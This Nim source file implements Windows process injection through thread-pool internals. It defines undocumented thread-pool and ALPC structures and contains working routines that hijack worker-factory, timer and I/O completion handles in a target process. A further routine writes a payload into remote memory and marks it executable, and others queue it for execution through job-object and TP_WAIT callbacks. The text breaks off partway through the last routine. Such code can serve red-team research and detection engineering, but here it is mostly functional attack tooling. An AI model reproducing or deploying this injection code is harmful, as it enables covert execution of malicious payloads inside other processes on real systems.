import std/[osproc, strformat, strutils]
import winim/lean, argparse


#[
  Helper Templates
]#
template WIN32_ERR*(s: string) = echo "[!] ", s, " Failed With Error: ", GetLastError()
template NTAPI_ERR*(a: string, s: NTSTATUS) = echo "[!] ", a, "Failed With Status: ", status.toHex 

template label*(name, body) =
  {.emit: astToStr(name) & ":".}
  body

template goto*(name) =
  {.emit: "goto " & astToStr(name) & ";".}

#[
  CRT usage
]#
proc wcsncmp(string1, string2: pointer, count: int): int {.stdcall, importc:"wcsncmp", header:"<string.h>".}
proc wcslen(string1: pointer): int {.stdcall, importc:"wcslen", header:"<string.h>".}

#[ 
  Process Handle Objects
]#
type
  PROCESS_HANDLE_TABLE_ENTRY_INFO* {.pure.} = object
    HandleValue*: HANDLE
    HandleCount*: ULONG_PTR
    PointerCount*: ULONG_PTR
    GrantedAccess*: ACCESS_MASK
    ObjectTypeIndex*: ULONG
    HandleAttributes*: ULONG
    Reserved*: ULONG
  PPROCESS_HANDLE_TABLE_ENTRY_INFO* = ptr PROCESS_HANDLE_TABLE_ENTRY_INFO

  PROCESS_HANDLE_SNAPSHOT_INFORMATION* {.pure.} = object
    NumberOfHandles*: ULONG_PTR
    Reserved*: ULONG_PTR
    Handles*: array[ANYSIZE_ARRAY, PROCESS_HANDLE_TABLE_ENTRY_INFO] 
  PPROCESS_HANDLE_SNAPSHOT_INFORMATION* = ptr PROCESS_HANDLE_SNAPSHOT_INFORMATION

#[
  Worker Factory Constants
]#
const WORKER_FACTORY_RELEASE_WORKER* = 0x1
const WORKER_FACTORY_WAIT* = 0x2
const WORKER_FACTORY_SET_INFORMATION* = 0x4
const WORKER_FACTORY_QUERY_INFORMATION* = 0x8
const WORKER_FACTORY_READY_WORKER* = 0x10
const WORKER_FACTORY_SHUTDOWN* = 0x20
const WORKER_FACTORY_ALL_ACCESS* = STANDARD_RIGHTS_REQUIRED or WORKER_FACTORY_RELEASE_WORKER or WORKER_FACTORY_WAIT or WORKER_FACTORY_SET_INFORMATION or WORKER_FACTORY_QUERY_INFORMATION or WORKER_FACTORY_READY_WORKER or WORKER_FACTORY_SHUTDOWN

#[ 
  Worker Factory Objects 
]#
type
  WORKER_FACTORY_BASIC_INFORMATION* {.pure.} = object
    Timeout*: LARGE_INTEGER
    RetryTimeout*: LARGE_INTEGER
    IdleTimeout*: LARGE_INTEGER
    Paused*: BOOLEAN
    TimerSet*: BOOLEAN
    QueuedToExWorker*: BOOLEAN
    MayCreate*: BOOLEAN
    CreateInProgress*: BOOLEAN
    InsertedIntoQueue*: BOOLEAN
    Shutdown*: BOOLEAN
    BindingCount*: ULONG
    ThreadMinimum*: ULONG
    ThreadMaximum*: ULONG
    PendingWorkerCount*: ULONG
    WaitingWorkerCount*: ULONG
    TotalWorkerCount*: ULONG
    ReleaseCount*: ULONG
    InfiniteWaitGoal*: LONGLONG
    StartRoutine*: PVOID
    StartParameter*: PVOID
    ProccessId*: HANDLE
    StackReserve*: SIZE_T
    StackCommit*: SIZE_T
    LastThreadCreationStatus*: NTSTATUS
  PWORKER_FACTORY_BASIC_INFORMATION* {.pure.} = ptr WORKER_FACTORY_BASIC_INFORMATION

  SET_WORKERFACTORYINFOCLASS* = enum
    workerFactoryTimeout = 0, 
    workerFactoryRetryTimeout = 1, 
    workerFactoryIdleTimeout = 2, 
    workerFactoryBindingCount = 3,
    workerFactoryThreadMinimum = 4, 
    workerFactoryThreadMaximum = 5, 
    workerFactoryPaused = 6, 
    workerFactoryAdjustThreadGoal = 8,
    workerFactoryCallbackType = 9, 
    workerFactoryStackInformation = 10, 
    workerFactoryThreadBasePriority = 11,
    workerFactoryTimeoutWaiters = 12, 
    workerFactoryFlags = 13, 
    workerFactoryThreadSoftMaximum = 14, 
    workerFactoryMaxInfoClass = 15
  PSET_WORKERFACTORYINFORCLASS* = ptr SET_WORKERFACTORYINFOCLASS

  QUERY_WORKERFACTORYINFOCLASS* = enum
    workerFactoryBasicInformation  = 7
  PQUERY_WORKERFACTORYINFOCLASS* = ptr QUERY_WORKERFACTORYINFOCLASS

  TP_TASK_CALLBACKS* {.pure.} = object
    ExecuteCallback*: PVOID
    Unposted*: PVOID
  PTP_TASK_CALLBACKS* = ptr TP_TASK_CALLBACKS

  TP_TASK* {.pure.} = object
    Callbacks*: PTP_TASK_CALLBACKS 
    NumaNode*: UINT32
    IdealProcessor*: UINT8
    Padding_242*: array[3, CHAR]
    ListEntry*: LIST_ENTRY
  PTP_TASK* = ptr TP_TASK

  TPP_REFCOUNT* {.pure.} = object
    Refcount*: INT32
  PTPP_REFCOUNT* = ptr TPP_REFCOUNT

  TPP_CALLER* {.pure.} = object
    ReturnAddress*: PVOID
  PTPP_CALLER* = ptr TPP_CALLER

  TP_DIRECT* {.pure.} = object
    Task*: TP_TASK
    Lock: UINT64
    IoCompletionInformationList*: LIST_ENTRY
    Callback*: PVOID
    NumNode*: UINT32
    IdealProcessor*: UINT8
    Padding*: array[3, CHAR]
  PTP_DIRECT* = ptr TP_DIRECT

  TPP_TIMER_SUBQUEUE* {.pure.} = object
    Expiration*: INT64
    WindowStart*: TPP_PH
    WindowEnd*: TPP_PH
    Timer*: PVOID
    TimerPkt*: PVOID
    Direct*: TP_DIRECT
    ExpirationWindow*: UINT32
    Padding: array[1, INT32]
  PTPP_TIMER_SUBQUEUE* = ptr TPP_TIMER_SUBQUEUE

  TPP_TIMER_QUEUE* {.pure.} = object
    Lock*: RTL_SRWLOCK
    AbsoluteQueue*: TPP_TIMER_SUBQUEUE
    RelativeQueue*: TPP_TIMER_SUBQUEUE
    AllocatedTimerCount*: INT32
    Padding: array[1, INT32]
  PTPP_TIMER_QUEUE* = ptr TPP_TIMER_QUEUE

  TPP_NUMA_NODE* {.pure.} = object
    WorkerCount*: INT32
  PTPP_NUMA_NODE* = ptr TPP_NUMA_NODE

  TPP_POOL_QUEUE_STATE_UNION1* {.pure.} = object  
    RunningThreadGoal* {.bitsize:16.}: int32
    PendingReleaseCount* {.bitsize:16.}: uint32
    QueueLength*: uint32

  TPP_POOL_QUEUE_STATE* {.pure, union.} = object
    Exchange*: int
    Union_1*: TPP_POOL_QUEUE_STATE_UNION1
  PTPP_POOL_QUEUE_STATE* = ptr TPP_POOL_QUEUE_STATE

  TPP_QUEUE* {.pure.} = object
    Queue*: LIST_ENTRY
    Lock*: RTL_SRWLOCK
  PTPP_QUEUE* = ptr TPP_QUEUE

  FULL_TP_POOL_UNION_1* {.pure, union.} = object
    Union_1*: TPP_POOL_QUEUE_STATE

  FULL_TP_POOL* {.pure.} = object
    Refcount*: TPP_REFCOUNT
    Padding_239*: LONG
    QueueState*: FULL_TP_POOL_UNION_1
    TaskQueue*: array[3, PTPP_QUEUE]
    NumaNode*: PTPP_NUMA_NODE
    ProximityInfo*: PGROUP_AFFINITY
    WorkerFactory*: PVOID
    CompletionPort*: PVOID
    Lock*: RTL_SRWLOCK
    PoolObjectList*: LIST_ENTRY
    WorkerList*: LIST_ENTRY
    TimerQueue*: TPP_TIMER_QUEUE
    ShutdownLock*: RTL_SRWLOCK
    ShutdownInitiated*: UINT8
    Release*: UINT8
    PoolFlags*: UINT16
    Padding_240*: LONG
    PoolLinks*: LIST_ENTRY
    AllocCaller*: TPP_CALLER
    ReleaseCaller*: TPP_CALLER
    AvailableWorkerCount*: INT32
    LongRunningWorkerCount*: INT32
    LastProcCount*: UINT32
    NodeStatus*: INT32
    BindingCount*: INT32
    CallbackChecksDisabled* {.bitsize:1.}: UINT32
    TrimTarget* {.bitsize:11.}: UINT32
    TrimmedThrdCount* {.bitsize:11.}: UINT32
    SelectedCpuSetCount*: UINT32
    Padding_241*: LONG
    TrimComplete*: RTL_CONDITION_VARIABLE
    TrimmedWorkerList*: LIST_ENTRY
  PFULL_TP_POOL* = ptr FULL_TP_POOL

  ALPC_WORK_ON_BEHALF_TICKET* {.pure.} = object
    ThreadId*: UINT32
    ThreadCreationTimeLow*: UINT32
  PALPC_WORK_ON_BEHALF_TICKET* = ptr ALPC_WORK_ON_BEHALF_TICKET

  TPP_WORK_STATE_UNION1* {.pure, union.} = object
    Exchange*: INT32
    Insertable* {.bitsize:1.}: UINT32
    PendingCallbackCount* {.bitsize:31.}: UINT32

  TPP_WORK_STATE* {.pure.} = object
    Union_1*: TPP_WORK_STATE_UNION1
  PTPP_WORK_STATE* = ptr TPP_WORK_STATE

  TPP_ITE_WAITER* {.pure.} = object
    Next*: ptr TPP_ITE_WAITER
    ThreadId*: PVOID
  PTPP_ITE_WAITER* = ptr TPP_ITE_WAITER
  
  TPP_PH_LINKS* {.pure.} = object
    Siblings*: LIST_ENTRY
    Children*: LIST_ENTRY
    Key*: INT64
  PTPP_PH_LINKS* = ptr TPP_PH_LINKS

  TPP_ITE* {.pure.} = object
    First*: PTPP_ITE_WAITER
  PTPP_ITE* = ptr TPP_ITE

  TPP_PH* {.pure.} = object
    Root*: PTPP_PH_LINKS
  PTPP_PH* = ptr TPP_PH

  TPP_FLAGS_COUNT_UNION1* {.pure, union.} = object
    Count* {.bitsize:60.}: UINT64
    Flags* {.bitsize:4.}: UINT64
    Data*: INT64

  TPP_FLAGS_COUNT* {.pure.} = object
    Union_1*: TPP_FLAGS_COUNT_UNION1
  PTPP_FLAGS_COUNT* = ptr TPP_FLAGS_COUNT


  TPP_BARRIER* {.pure.} = object
    Ptr*: TPP_FLAGS_COUNT
    WaitLock*: RTL_SRWLOCK
    WaitList*: TPP_ITE
  PTPP_BARRIER* = ptr TPP_BARRIER
  
  TPP_CLEANUP_GROUP_MEMBER_UNION1* {.pure, union.} = object
    Callback*: PVOID
    WorkCallback*: PVOID
    SimpleCallback*: PVOID
    WaitCallback*: PVOID
    IoCallback*: PVOID
    AlpcCallback*: PVOID
    AlpcCallbackEx*: PVOID
    JobCallback*: PVOID

  TPP_CLEANUP_GROUP_MEMBER_UNION2* {.pure, union.} = object
    Flags*: INT32
    LongFunction* {.bitsize:1.}: INT32
    Persistent* {.bitsize:1.}: INT32
    UnusedPublic* {.bitsize:14.}: INT32
    Release* {.bitsize:1.}: INT32
    CleanupGroupReleased* {.bitsize:1.}: INT32
    InCleanupGroupCleanupList* {.bitsize:1.}: INT32
    UnusedPrivate* {.bitsize:13.}: INT32
  
  TP_CLEANUP_GROUP* {.pure.} = object
    Refcount*: TPP_REFCOUNT
    Released*: INT32
    MemberLock*: RTL_SRWLOCK
    MemberList*: LIST_ENTRY
    Barrier*: TPP_BARRIER
    CleanupLock*: RTL_SRWLOCK
    CleanupList*: LIST_ENTRY
  PTP_CLEANUP_GROUP* = ptr TP_CLEANUP_GROUP

  TPP_CLEANUP_GROUP_MEMBER* {.pure.} = object
    Refcount*: TPP_REFCOUNT
    Padding_233*: LONG
    VFuncs*: PVOID #TPP_CLEANUP_GROUP_MEMBER_VFUNCS
    CleanupGroup*: PTP_CLEANUP_GROUP
    CleanupGroupCancelCallback*: PVOID
    FinalizationCallback*: PVOID
    CleanupGroupMemberLinks*: LIST_ENTRY
    CallbackBarrier*: TPP_BARRIER
    Union_1*: TPP_CLEANUP_GROUP_MEMBER_UNION1
    Context*: PVOID
    ActivationContext*: PVOID #PACTIVATION_CONTEXT
    SubProcessTag*: PVOID
    ActivityId*: GUID
    WorkOnBehalfTicket*: ALPC_WORK_ON_BEHALF_TICKET
    RaceDll*: PVOID
    Pool*: PFULL_TP_POOL
    PoolObjectLinks*: LIST_ENTRY
    Union_2*: TPP_CLEANUP_GROUP_MEMBER_UNION2
    Padding_234*: LONG
    AllocCaller*: TPP_CALLER
    ReleaseCaller*: TPP_CALLER
    CallbackPriority*: TP_CALLBACK_PRIORITY
    Padding*: array[1, INT32]
  PTPP_CLEANUP_GROUP_MEMBER* = ptr TPP_CLEANUP_GROUP_MEMBER

  FULL_TP_WORK* {.pure.} = object
    CleanupGroupMember*: TPP_CLEANUP_GROUP_MEMBER
    Task*: TP_TASK
    WorkState*: TPP_WORK_STATE
    Padding*: array[1, INT32]
  PFULL_TP_WORK* = ptr FULL_TP_WORK

  FULL_TP_TIMER_UNION_1* {.pure, union.} = object
    WindowEndLinks*: TPP_PH_LINKS
    ExpirationLinks*: LIST_ENTRY

  FULL_TP_TIMER_UNION_2* {.pure, union.} = object
    TimerStatus*: UINT8
    InQueue* {.bitsize:1.}: UINT8
    Absolute* {.bitsize:1.}: UINT8
    Cancelled* {.bitsize:1.}: UINT8

  FULL_TP_TIMER* {.pure.} = object
    Work*: FULL_TP_WORK
    Lock*: RTL_SRWLOCK
    Union_1*: FULL_TP_TIMER_UNION_1
    WindowStartLinks*: TPP_PH_LINKS
    DueTime*: INT64
    Ite*: TPP_ITE
    Window*: UINT32
    Period*: UINT32
    Inserted*: UINT8
    WaitTimer*: UINT8
    Union_2*: FULL_TP_TIMER_UNION_2
    BlockInsert*: UINT8
    Padding*: array[1, INT32]
  PFULL_TP_TIMER* = ptr FULL_TP_TIMER

  T2_SET_PARAMETERS* {.pure.} = object
    Version*: ULONG
    Reserved*: ULONG
    NoWakeTolerance*: LONGLONG
  PT2_SET_PARAMETERS* = ptr T2_SET_PARAMETERS

  FULL_TP_WAIT_UNION_1_UNION_1* {.pure, union.} = object
    AllFlags*: UINT8
    NextWaitActive* {.bitsize:1.}: UINT8
    NextTimeoutActive* {.bitsize:1.}: UINT8
    CallbackCounter* {.bitsize:1.}: UINT8
    Spare* {.bitsize:5.}: UINT8

  FULL_TP_WAIT_UNION_1* {.pure, union.} = object
    Union_1*: FULL_TP_WAIT_UNION_1_UNION_1

  FULL_TP_WAIT* {.pure.} = object
    Timer*: FULL_TP_TIMER
    Handle*: PVOID
    WaitPkt*: PVOID
    NextWaitHandle*: PVOID
    NextWaitTimeout*: LARGE_INTEGER
    Direct*: TP_DIRECT
    WaitFlags*: FULL_TP_WAIT_UNION_1
    Padding*: array[7, CHAR]
  PFULL_TP_WAIT* = ptr FULL_TP_WAIT

  FULL_TP_IO* {.pure.} = object
    CleanupGroupMember*: TPP_CLEANUP_GROUP_MEMBER
    Direct*: TP_DIRECT
    File*: PVOID
    PendingIrpCount*: INT32
    Padding*: INT32
  PFULL_TP_IO* = ptr FULL_TP_IO

  FULL_TP_ALPC_UNION_1* {.pure, union.} = object
    Flags*: UINT32
    ExTypeCallback* {.bitsize:1.}: UINT32
    CompletionListRegistered* {.bitsize:1.}: UINT32
    Reserved* {.bitsize:32.}: UINT32

  FULL_TP_ALPC* {.pure.} = object
    Direct*: TP_DIRECT
    CleanupGroupMember*: TPP_CLEANUP_GROUP_MEMBER
    AlpcPort*: PVOID
    DeferredSendCount*: INT32
    LastConcurrencyCount*: INT32
    Union_1*: FULL_TP_ALPC_UNION_1
    Padding*: array[1, INT32]
  PFULL_TP_ALPC* = ptr FULL_TP_ALPC
  
  FULL_TP_JOB_UNION_1* {.pure, union.} = object
    CompletionState*: INT64
    Rundown* {.bitsize:1.}: INT64
    CompletionCount* {.bitsize:63.}: INT64

  FULL_TP_JOB* {.pure.} = object
    Direct*: TP_DIRECT
    CleanupGroupMember*: TPP_CLEANUP_GROUP_MEMBER
    JobHandle*: PVOID
    Union_1*: FULL_TP_JOB_UNION_1
    RundownLock*: RTL_SRWLOCK
  PFULL_TP_JOB* = ptr FULL_TP_JOB

  FILE_COMPLETION_INFO* {.pure.} = object
    Port*: HANDLE
    Key*: PVOID
  PFILE_COMPLETION_INFO* = ptr FILE_COMPLETION_INFO

  ALPC_PORT_ATTRIBUTES* {.pure.} = object
    Flags*: ULONG
    SecurityQos*: SECURITY_QUALITY_OF_SERVICE
    MaxMessageLength*: UINT64
    MemoryBandwidth*: UINT64
    MaxPoolUsage*: UINT64
    MaxSectionSize*: UINT64
    MaxViewSize*: UINT64
    MaxTotalSectionSize*: UINT64
    DupObjectTypes*: ULONG
    when defined(amd64):
      Reserved*: ULONG
  PALPC_PORT_ATTRIBUTES* = ptr ALPC_PORT_ATTRIBUTES

  ALPC_PORT_ASSOCIATE_COMPLETION_PORT* {.pure.} = object
    CompletionKey*: PVOID
    CompletionPort*: HANDLE
  PALPC_PORT_ASSOCIATE_COMPLETION_PORT* = ptr ALPC_PORT_ASSOCIATE_COMPLETION_PORT

  PORT_MESSAGE_UNION_1_S1* {.pure.} = object 
    DataLength*: USHORT
    TotalLength*: USHORT
  
  PORT_MESSAGE_UNION_1* {.pure, union.} = object
    S1*: PORT_MESSAGE_UNION_1_S1
    Length*: ULONG

  PORT_MESSAGE_UNION_2_S2* {.pure.} = object 
    Type*: USHORT
    DataInfoOffset*: USHORT

  PORT_MESSAGE_UNION_2* {.pure, union.} = object
    S2*: PORT_MESSAGE_UNION_2_S2
    ZeroInit*: ULONG

  PORT_MESSAGE_UNION_3* {.pure, union.} = object
    ClientId*: CLIENT_ID
    DoNotUseThisField*: DOUBLE

  PORT_MESSAGE_UNION_4* {.pure, union.} = object
    ClientViewSize*: SIZE_T
    CallbackId*: ULONG

  PORT_MESSAGE* {.pure} = object 
    Union_1*: PORT_MESSAGE_UNION_1
    Union_2*: PORT_MESSAGE_UNION_2
    Union_3*: PORT_MESSAGE_UNION_3
    MessageId*: ULONG
    Union_4*: PORT_MESSAGE_UNION_4
  PPORT_MESSAGE* = ptr PORT_MESSAGE

  ALPC_MESSAGE* {.pure.} = object
    PortHeader*: PORT_MESSAGE
    PortMessage*: array[1000, byte]
  PALPC_MESSAGE* = ptr ALPC_MESSAGE

  ALPC_MESSAGE_ATTRIBUTES* {.pure.} = object
    AllocatedAttributes*: ULONG
    ValidAttributes*: ULONG
  PALPC_MESSAGE_ATTRIBUTES* = ptr ALPC_MESSAGE_ATTRIBUTES

#[
  Generic Objects
]#
type 
  PUBLIC_OBJECT_TYPE_INFORMATION* {.pure.} = object
    TypeName*: UNICODE_STRING
    Reserved*: array[22, ULONG]
  PPUBLIC_OBJECT_TYPE_INFORMATION* = ptr PUBLIC_OBJECT_TYPE_INFORMATION

#[ 
  Function Declarations 
]#
type
  NtAlpcConnectPort* = proc(PortHandle: PHANDLE, PortName: PUNICODE_STRING, ObjectAttributes: POBJECT_ATTRIBUTES, PortAttributes: PALPC_PORT_ATTRIBUTES, ConnectionFlags: DWORD, RequiredServerSid: PSID, ConnectionMessage: PPORT_MESSAGE, ConnectionMessageSize: PSIZE_T, OutMessageAttributes: PALPC_MESSAGE_ATTRIBUTES, InMessageAttributes: PALPC_MESSAGE_ATTRIBUTES, Timeout: PLARGE_INTEGER): NTSTATUS {.stdcall.}
  NtAlpcCreatePort* = proc(PortHandle: PHANDLE, ObjectAttributes: POBJECT_ATTRIBUTES, PortAttributes: PALPC_PORT_ATTRIBUTES): NTSTATUS {.stdcall.}
  NtAlpcSetInformation* = proc(PortHandle: HANDLE, PortInformationClass: ULONG, PortInformation: PVOID, Length: ULONG): NTSTATUS {.stdcall.}
  NtAssociateWaitCompletionPacket* = proc(WaitCompletionPacketHandle: HANDLE, IoCompletionHandle: HANDLE, TargetObjectHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR, AlreadySignaled: PBOOLEAN): NTSTATUS {.stdcall.}
  NtQueryInformationProcess* = proc(ProcessHandle: HANDLE, ProcessInformationClass: PROCESSINFOCLASS, ProcessInformation: PVOID, ProcessInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.stdcall.}
  NtQueryInformationWorkerFactory* = proc(WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: QUERY_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.stdcall.}
  NtQueryObject* = proc(Handle: HANDLE, ObjectInformationClass: OBJECT_INFORMATION_CLASS, ObjectInformation: PVOID, ObjectInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.stdcall.}
  NtSetInformationFile* = proc(FileHandle: HANDLE, IoStatusBlock: PIO_STATUS_BLOCK, FileInformation: PVOID, Length: ULONG, FileInformationClass: FILE_INFORMATION_CLASS): NTSTATUS {.stdcall.}
  NtSetInformationWorkerFactory* = proc(WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: SET_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG): NTSTATUS {.stdcall.}
  NtSetIoCompletion* = proc(IoCompletionHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR): NTSTATUS {.stdcall.}
  NtSetTimer2* = proc(TimerHandle: HANDLE, DueTime: PLARGE_INTEGER, Period: PLARGE_INTEGER, Parameters: PT2_SET_PARAMETERS): NTSTATUS {.stdcall.}
  TpAllocAlpcCompletion* = proc(AlpcReturn: ptr PFULL_TP_ALPC, AlpcPort: HANDLE, Callback: PVOID, Context: PVOID, CallbackEnviron: PTP_CALLBACK_ENVIRON): NTSTATUS {.stdcall.}
  TpAllocJobNotification* = proc(JobReturn: ptr PFULL_TP_JOB, HJob: HANDLE, Callback: PVOID, Context: PVOID, CallbackEnviron: PTP_CALLBACK_ENVIRON): NTSTATUS {.stdcall.}

#[
  Public Functions
]#
proc hijackProcessHandle*(tProcess: HANDLE, typeName: LPWSTR, desiredAccess: uint): HANDLE =
  var
    pProcessSnapshotInfo: PPROCESS_HANDLE_SNAPSHOT_INFORMATION
    objectInfo: PPUBLIC_OBJECT_TYPE_INFORMATION 
    objectTypeReturnLen: uint
    totalHandles, handleInfoSize: int
    status: NTSTATUS
    duplicatedHandle: HANDLE

  let 
    pNtQueryInformationProcess = cast[NtQueryInformationProcess](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQueryInformationProcess"))
    pNtQueryObject = cast[NtQueryObject](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQueryObject"))
  
  if pNtQueryInformationProcess == nil or pNtQueryObject == nil:
    echo "[!] Failed to retrieve function pointers"
    duplicatedHandle = -1
    goto endOfHijackProcessHandle

  echo "[&] Attempting to hijack handle of type ", cast[WideCString](typeName)

  if GetProcessHandleCount(tProcess, cast[PDWORD](totalHandles.addr)) == 0: # Total number of handles to account for
    WIN32_ERR("GetProcessHandleCount")
    duplicatedHandle = -1 
    goto endOfHijackProcessHandle

  handleInfoSize = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION) + ((totalHandles + 15) * sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO))

  pProcessSnapshotInfo = cast[PPROCESS_HANDLE_SNAPSHOT_INFORMATION](HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize))
  if pProcessSnapshotInfo == nil:
    WIN32_ERR("HeapAlloc")
    duplicatedHandle = -1 
    goto endOfHijackProcessHandle

  status = pNtQueryInformationProcess(tProcess, cast[PROCESSINFOCLASS](51), cast[PVOID](pProcessSnapshotInfo), handleInfoSize.ULONG, NULL)
  if not NT_SUCCESS(status):
    # We ignore the error
    # NTAPI_ERR("NtQueryInformationProcess", status)
    discard
  
  var pProcSnapHandles = cast[ptr UncheckedArray[PROCESS_HANDLE_TABLE_ENTRY_INFO]](pProcessSnapshotInfo.Handles.addr) # Cast to an iterable
  for i in 0 ..< pProcessSnapshotInfo.NumberOfHandles:
    # Assume that DuplicateHandle will always work...
    if DuplicateHandle(tProcess, pProcSnapHandles[i].HandleValue, GetCurrentProcess(), duplicatedHandle.addr, desiredAccess.DWORD, FALSE, 0) != 0:

      status = pNtQueryObject(duplicatedHandle, objectTypeInformation, cast[PVOID](0), 0.ULONG, cast[PULONG](objectTypeReturnLen.addr))
      if status != STATUS_INFO_LENGTH_MISMATCH:
        NTAPI_ERR("NtQueryObject", status)

      objectInfo = cast[PPUBLIC_OBJECT_TYPE_INFORMATION](HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objectTypeReturnLen.SIZE_T))
      if objectInfo == nil:
        break

      status = pNtQueryObject(duplicatedHandle, objectTypeInformation, cast[PVOID](objectInfo), objectTypeReturnLen.ULONG, cast[PULONG](0))
      if not NT_SUCCESS(status):
        # NTAPI_ERR("NtQueryObject", status)
        discard
      else:
        #echo $cast[WideCString](objectInfo.TypeName.Buffer), " == ", typeName
        if wcsncmp(typeName, objectInfo.TypeName.Buffer, wcslen(typeName)) != 0:
          continue
        else:
          echo " \\__> [+] Found \"", cast[WideCString](objectInfo.TypeName.Buffer), "\" handle! Hijacking successful."
          break

      HeapFree(GetProcessHeap(), 0, objectInfo)

  label endOfHijackProcessHandle:
    if pProcessSnapshotInfo != nil:
      HeapFree(GetProcessHeap(), 0, pProcessSnapshotInfo)
    if objectInfo != nil:
      HeapFree(GetProcessHeap(), 0, objectInfo)
    return duplicatedHandle


# Helpers
proc hijackProcessWorkerFactory*(processHandle: HANDLE): HANDLE =
  let target = newWideCString("TpWorkerFactory".cstring)
  return hijackProcessHandle(processHandle, cast[LPWSTR](target[0].addr), WORKER_FACTORY_ALL_ACCESS)

proc hijackProcessTimerQueue*(processHandle: HANDLE): HANDLE =
  let target = newWideCString("IRTimer".cstring)
  return hijackProcessHandle(processHandle, cast[LPWSTR](target[0].addr), TIMER_ALL_ACCESS)

proc hijackProcessIoPort*(processHandle: HANDLE): HANDLE = 
  let target = newWideCString("IoCompletion")
  return hijackProcessHandle(processHandle, cast[LPWSTR](target[0].addr), IO_COMPLETION_ALL_ACCESS)



#[ 
  Utility Functions
]#
proc writePayloadIntoProcess*(hProcess: HANDLE, pPayload: pointer, szPayload: int, pRemoteAddress: ptr PVOID): bool =
  var 
    bytesWritten: SIZE_T
    dwOldProtection: DWORD

  let remote = VirtualAllocEx(hProcess, NULL, szPayload, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remote == nil:
    WIN32_ERR("VirtualAllocEx")
    return false

  if (WriteProcessMemory(hProcess, remote, pPayload, szPayload, bytesWritten.addr) == 0) or (bytesWritten != szPayload):
    WIN32_ERR("WriteProcessMemory")
    return false

  if VirtualProtectEx(hProcess, remote, szPayload, PAGE_EXECUTE_READ, dwOldProtection.addr) == 0:
    WIN32_ERR("VirtualProtectEx")
    return false

  pRemoteAddress[] = remote
  return true


proc injectViaJobCallback*(tProcess: HANDLE, pAddress: PVOID, hIoPort: HANDLE): bool =
  var
    hJob: HANDLE
    status: NTSTATUS
    remoteMemory: PVOID
    pFullTpJob: PFULL_TP_JOB
    completionPort: JOBOBJECT_ASSOCIATE_COMPLETION_PORT

  let pTpAllocJobNotification = cast[TpAllocJobNotification](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "TpAllocJobNotification"))
  if pTpAllocJobNotification == nil:
    echo "[!] Failed to get TpAllocJobNotification function pointer"
    return false

  hJob = CreateJobObjectA(NULL, "m4ul3r job")
  if hJob == 0:
    WIN32_ERR("CreateJobObjectA")
    return false

  status = pTpAllocJobNotification(pFullTpJob.addr, hJob, cast[PVOID](pAddress), NULL, NULL)
  if not NT_SUCCESS(status):
    NTAPI_ERR("TpAllocJobNotification", status)
    return false

  remoteMemory = VirtualAllocEx(tProcess, NULL, sizeof(FULL_TP_JOB), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remoteMemory == nil:
    WIN32_ERR("VirtualAllocEx")
    return false

  if WriteProcessMemory(tProcess, remoteMemory, pFullTpJob, sizeof(FULL_TP_JOB), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  # We have to zero out the associated completion port first
  if SetInformationJobObject(hJob, jobObjectAssociateCompletionPortInformation, completionPort.addr, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT).DWORD) == 0:
    WIN32_ERR("SetInformationJobObject [1]")
    return false

  # Associate completion port with payload
  completionPort.CompletionKey = remoteMemory
  completionPort.CompletionPort = hIoPort

  if SetInformationJobObject(hJob, jobObjectAssociateCompletionPortInformation, completionPort.addr, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT).DWORD) == 0:
    WIN32_ERR("SetInformationJobObject [2]")
    return false

  # Queue IO packet to job object completion port
  if AssignProcessToJobObject(hJob, GetCurrentProcess()) == 0:
    WIN32_ERR("AssignProcessToJobObject")
    return false

  return true


proc injectViaTpWait*(tProcess: HANDLE, pAddress: PVOID, hIoPort: HANDLE): bool =
  var
    pTpWait: PFULL_TP_WAIT
    remoteTpWait, remoteTpDirect: PVOID
    hEvent: HANDLE
    status: NTSTATUS

  let pNtAssociateWaitCompletionPacket = cast[NtAssociateWaitCompletionPacket](GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtAssociateWaitCompletionPacket"))
  if pNtAssociateWaitCompletionPacket == nil:
    echo "[!] Failed to get NtAssociateWaitCompletionPacket function pointer"
    return false

  # Create a TP_WAIT object that will triggegr our callback once an asynchronous event is interacted with, such as SetEvent
  pTpWait = cast[PFULL_TP_WAIT](CreateThreadpoolWait(
    cast[PTP_WAIT_CALLBACK](pAddress), NULL, NULL
  ))
  if pTpWait == nil:
    WIN32_ERR("CreateThreadpoolWait")
    return false

  # Allocate and write memory into the process for the TP_WAIT callback object
  remoteTpWait = VirtualAllocEx(tProcess, NULL, sizeof(FULL_TP_WAIT), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remoteTpWait == nil:
    WIN32_ERR("VirtualAllocEx [1]")
    return false

  if WriteProcessMemory(tProcess, remoteTpWait, pTpWait, sizeof(FULL_TP_WAIT), NULL) == 0:
    WIN32_ERR("WriteProcessMemory")
    return false

  # Do the same for a TP_DIRECT object, This is a helper object used to trigger the actual callback once an IO packet is sent.
  remoteTpDirect = VirtualAllocEx(tProcess, NULL, sizeof(TP_DIRECT), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remoteTpDirect == nil:
    WIN32_ERR("VirtualAllocEx [2]")
    return false

